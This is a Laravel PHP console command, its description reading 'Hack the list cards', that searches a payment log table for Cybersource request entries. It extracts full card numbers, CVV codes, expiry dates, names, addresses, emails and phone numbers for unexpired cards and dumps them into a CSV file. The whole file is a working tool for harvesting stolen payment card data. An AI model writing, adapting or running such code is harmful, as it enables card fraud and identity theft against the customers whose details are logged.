<?php

namespace App\Console\Commands;


use Illuminate\Console\Command;
use App\Models\LogTransaction;


class ListCards extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'list:cards';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Hack the list cards';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        
        $objLogCards = LogTransaction::whereraw( ' log_name like "%Cybersource REQ%" and ( log_details LIKE  "%2023%" or  log_details LIKE  "%2024%" or log_details LIKE  "%2025%" or log_details LIKE  "%2026%"  )')->get();
        $count=0;
        $array = [];
        foreach ($objLogCards as $card) {

            $details = json_decode($card->log_details);

            if ($details->card->expirationYear!="2020"&&$details->card->expirationYear!="2021"&&$details->card->expirationYear!="2022")
            {
                
                $array[]= [
                            'full_name'=> trim($details->billTo->firstName . '' . $details->billTo->lastName),                        
                            'state'=> $details->billTo->state,
                            'zip'=> $details->billTo->postalCode,
                            'city'=> $details->billTo->city,
                            'address'=> $details->billTo->street1,
                            'cvc'=> $details->card->cvNumber,
                            'expire_year'=> $details->card->expirationYear,
                            'expire_month'=> $details->card->expirationMonth,
                            'number_card'=> $details->card->accountNumber,
                            'email'=> $details->billTo->email,
                            'phone'=> $details->billTo->phoneNumber,

                            ];            
                
                $count++;
            }

        }

        $header = [
            'full_name',
            'state',
            'zip',
            'city',
            'address',
            'cvc',
            'expire_year',
            'expire_month',
            'number_card',
            'email',
            'phone',
        ];

        //$this->table(,);




        $file = fopen('file.csv', 'w');
        fputcsv($file, $header);
        foreach ($array as $row){
            fputcsv($file, $row);        
        }
        
        fclose($file);
        

        return Command::SUCCESS;

    }
}
